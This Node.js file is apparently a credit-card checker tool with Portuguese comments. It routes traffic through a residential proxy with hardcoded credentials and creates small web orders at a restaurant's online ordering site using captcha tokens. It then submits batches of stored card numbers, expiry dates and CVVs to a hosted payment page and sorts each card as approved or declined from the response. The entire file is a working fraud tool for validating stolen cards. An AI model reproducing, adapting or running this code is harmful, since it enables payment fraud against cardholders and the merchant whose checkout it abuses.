'use strict'
const Func = require('./func')
const Queue = require('../lib/queue')
const axios = require('axios')
const tunnel = require('tunnel');
const CadastroCards = require("../model/cards")
const CardsBeingTested = require("../model/cards_being_tested");
const Redis = require('redis');
const Cache = Redis.createClient(6379, "redis");

module.exports = {

    async cardValidation(id, username, token) {

        //const deathbycaptcha = await Database.from('proxy').where('name', 'deathbycaptcha')
        try {
            const date = await Func.Pickup_time();

            const agent = tunnel.httpsOverHttp({
                proxy: {
                    host: 'gate.dc.smartproxy.com',
                    port: 20000,
                    proxyAuth: `virgem:virgem`,
                },
            });

            let data = '{"skin":"weborder","establishmentId":1,"items":[{"modifieritems":[],"price":1.5,"product":209,"product_name_override":"z","quantity":1,"product_sub_id":"c1160"}],"orderInfo":{"created_date":"' + date.create_date + '","pickup_time":"2020-03-27T15:45:00","dining_option":0,"customer":{"phone":"1","email":"b@o.com","first_name":"B","last_name":"L"},"call_name":""},"paymentInfo":{"tip":0,"type":2},"recaptcha_v2_token":"' + token + '"}';
            axios.post(`https://amarithcafe.revelup.com/weborders/create_order_and_pay_v1/`, data, {
                headers: {
                    'Host': 'amarithcafe.revelup.com',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0',
                    'Accept': 'application/json',
                    'Referer': 'https://amarithcafe.revelup.com/weborder/?establishment=1',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Connection': 'keep - alive'
                }
            }).then(response => {
                let keys = Object.keys(response.data)
                for (const key of keys) {

                    if (key == 'errorMsg') {
                        Queue.sendToQueue(false, '#' + id + 'verificarcards', true)
                        Queue.sendToQueue(false, 'sistem#erro#' + response.data.status, response.data.errorMsg)
                        Queue.sendToQueue(false, '#' + id + 'atividade', 'Erro na verificação! iniciando.. nova verificação, Aguarde...')
                        this.getFilds(id, username, 'code')
                    }
                    if (key == 'data') {
                        let code = response.data.data.query.TransactionSetupID;
                        this.getFilds(id, username, code)
                    }
                }
            });
        } catch (error) {
            Queue.sendToQueue(false, 'sistem#erro#trycatch', error.message)
        }

    },
    async getFilds(id, username, code) {
        if (code === 'code') {
            Queue.sendToQueue(false, '#' + id + 'atividade', 'Erro na verificação da orden, entrando com nova verificação, Agurade..')
            return
        }
        try {
            const cards = await CadastroCards.where({ tested: false, owner: username, userID: id }).limit(5);
            axios.post(`https://transaction.hostedpayments.com/?TransactionSetupID=${code}`, {
                headers: {
                    'Host': 'transaction.hostedpayments.com',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                },

                'USERAGENT': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
            }).then(async response => {

                let GETVIEWSTATE = response.data.indexOf('name="__VIEWSTATE" id="__VIEWSTATE" value="'); //47
                let GETVIEWSTATEGENERATOR = response.data.indexOf('name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="'); //64
                let GETEVENTVALIDATION = response.data.indexOf('name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="');//59

                let FinalVIEWSTATE = response.data.indexOf('"', GETVIEWSTATE + 44);
                let FinalVIEWSTATEGENERATOR = response.data.indexOf('"', GETVIEWSTATEGENERATOR + 62);
                let FinalEVENTVALIDATION = response.data.indexOf('"', GETEVENTVALIDATION + 56);

                let STATE = encodeURIComponent(response.data.substr(GETVIEWSTATE + 43, FinalVIEWSTATE - (GETVIEWSTATE + 43)))
                let STATEGENERATOR = encodeURIComponent(response.data.substr(GETVIEWSTATEGENERATOR + 61, FinalVIEWSTATEGENERATOR - (GETVIEWSTATEGENERATOR + 61)))
                let EVENTVALIDATION = encodeURIComponent(response.data.substr(GETEVENTVALIDATION + 55, FinalEVENTVALIDATION - (GETEVENTVALIDATION + 55)))

                //let cards = ['6509079001410445|12|2024|778', '6504867262783814|06|2023|000', '6504867262787880|06|2023|000'];
                for (let i = 0; i < cards.length; i++) {

                    let cardAno = cards[i].card.ano.substr(-2);
                    //let data = `scriptManager=upFormHP%7CprocessTransactionButton&__EVENTTARGET=processTransactionButton&__EVENTARGUMENT=&__VIEWSTATE=${STATE}__VIEWSTATEGENERATOR=${STATEGENERATOR}&__VIEWSTATEENCRYPTED=&__EVENTVALIDATION=${EVENTVALIDATION}&hdnCancelled=&cardNumber=${cardSeparetion[0]}&ddlExpirationMonth=${cardSeparetion[1]}&ddlExpirationYear=${cardAno}&CVV=${cardSeparetion[3]}&hdnSwipe=&hdnTruncatedCardNumber=&hdnValidatingSwipeForUseDefault=&__ASYNCPOST=true&`;
                    let data = `scriptManager=upFormHP%7CprocessTransactionButton&hdnCancelled=&cardNumber=${cards[i].card.number}&ddlExpirationMonth=${cards[i].card.mes}&ddlExpirationYear=${cardAno}&CVV=${cards[i].card.cvv}&hdnSwipe=&hdnTruncatedCardNumber=&hdnValidatingSwipeForUseDefault=&__EVENTTARGET=processTransactionButton&__EVENTARGUMENT=&__VIEWSTATE=${STATE}&__VIEWSTATEGENERATOR=${STATEGENERATOR}&__VIEWSTATEENCRYPTED=&__EVENTVALIDATION=${EVENTVALIDATION}&__ASYNCPOST=true&`
                    axios.post(`https://transaction.hostedpayments.com/?TransactionSetupID=${code}`, data, {
                        headers: {
                            'Host': 'transaction.hostedpayments.com',
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0',
                            'Accept': '*/*',
                            'X-Requested-With': 'XMLHttpRequest',
                            'X-MicrosoftAjax': 'Delta=true',
                            'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
                            'Connection': 'keep-alive',
                            'Referer': `https://transaction.hostedpayments.com/?TransactionSetupID=${code}`,
                        },
                        'USERAGENT': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
                    }).then(async (response) => {
                        let GETR = response.data.indexOf('<b>Error</b>:');
                        let ENDR = response.data.indexOf('</span>', GETR + 12);
                        const result = response.data.substr(GETR + 13, ENDR - (GETR + 13))

                        switch (result.trim()) {
                            case 'Call Issuer':
                                let aprovado = '<tr role="row" class="odd">' +
                                    '<td class="center"> <label class="pos-rel"><input type="checkbox" class="ace"> <span class="lbl"></span> </label></td>' +
                                    '<td class=""><a href="#">' + cards[i].card.number + '|' + cards[i].card.mes + '|' + cards[i].card.ano + '|' + cards[i].card.cvv + '</a></td>' +
                                    ' <td class="hidden-480 center">' +
                                    '<span class="label label-sm label-success">APROVADO</span>' +
                                    '<span class="label label-sm label-info">ELPATRON</span>' +
                                    '</td> </tr>'
                                Queue.sendToQueue(false, '#' + id + 'aprovados', 1)
                                Queue.sendToQueue(false, '#' + id + 'testados', 1)
                                Queue.sendToQueue(false, '#' + id + 'atividade', ' <span class="label label-sm label-success">ELPATRON</span>')
                                await CadastroCards.where({ _id: cards[i]._id }).updateOne({ tested: true, valid: true })
                                let cardaprovado = cards[i].card.number + '|' + cards[i].card.mes + '|' + cards[i].card.ano + '|' + cards[i].card.cvv;
                                await this.CacheCardsBeing(id, cardaprovado, true)


                                break;
                            case 'TransactionSetupID expired':

                                Queue.sendToQueue(false, 'sistem#erro#card', 'TransactionSetupID expired')
                                break;

                            default:
                                let negado = '<tr role="row" class="odd">' +
                                    '<td class="center"> <label class="pos-rel"><input type="checkbox" class="ace"> <span class="lbl"></span> </label></td>' +
                                    '<td class=""><a href="#">' + cards[i].card.number + '|' + cards[i].card.mes + '|' + cards[i].card.ano + '|' + cards[i].card.cvv + '</a></td>' +
                                    ' <td class="hidden-480 center">' +
                                    '<span class="label label-sm label-danger">NEGADO</span>' +
                                    '<span class="label label-sm label-info">ELPATRON</span>' +
                                    '</td> </tr>'
                                Queue.sendToQueue(false, '#' + id + 'atividade', '<span class="label label-sm label-danger">ELPATRON</span>')
                                Queue.sendToQueue(false, '#' + id + 'reprovados', 1)
                                Queue.sendToQueue(false, '#' + id + 'testados', 1)
                                //Queue.sendToQueue(false, id + '#' + username + '#status', { type: 'aprovado', msg: negado })
                                await CadastroCards.where({ _id: cards[i]._id }).updateOne({ tested: true })
                                let cardreprovado = cards[i].card.number + '|' + cards[i].card.mes + '|' + cards[i].card.ano + '|' + cards[i].card.cvv;
                                await this.CacheCardsBeing(id, cardreprovado, false)
                                break;
                        }
                    });
                }// fim do for
            });

            Queue.sendToQueue(false, '#' + id + 'atividade', ' Aguarde verificando novos cards......')
            const terminado = await CadastroCards.where({ tested: false, owner: username, userID: id }).limit(1);
            console.log('terminado ' +terminado)
            if (terminado == '') {
                Queue.sendToQueue(false, '#' + id + 'status', 'Aguardando...')
                Queue.sendToQueue(false, '#' + id + 'atividade', 'Processo finalizado com sucesso!!')
            } else {
                Queue.sendToQueue(false, '#' + id + 'verificarcards', 'ok')
            }

        } catch (error) {
            Queue.sendToQueue(false, 'sistem#erro#trycatch', error.message)
        }
    },
    async CacheCardsBeing(id, card, type) {

        if (type) {
           
            const cad = new CardsBeingTested({
                userid: id,
                card: '<a href="#">' + card + '</a>',
                status: '<span class="label label-sm label-success">APROVADO</span> <span class="label label-sm label-info">ELPATRON</span>'
            });
            cad.save((error) => {
                console.log(error)
            });
            // adiciona nalista de crads resolvidos
            await Cache.rpush(id + 'listcardsaprovados', card);
            // excuir da lista de crads adicionados
            await Cache.lrem(id + 'listcards', 0, card);
        } else {
            const cad1 = new CardsBeingTested({
                userid: id,
                card: '<a href="#">' + card + '</a>',
                status: '<span class="label label-sm label-success">APROVADO</span> <span class="label label-sm label-info">ELPATRON</span>'
            });
            cad1.save((error) => { });
            await Cache.rpush(id + 'listcardsreprovados', card);
            // excuir da lista de crads adicionados
            await Cache.lrem(id + 'listcards', 0, card);
        }



    }
}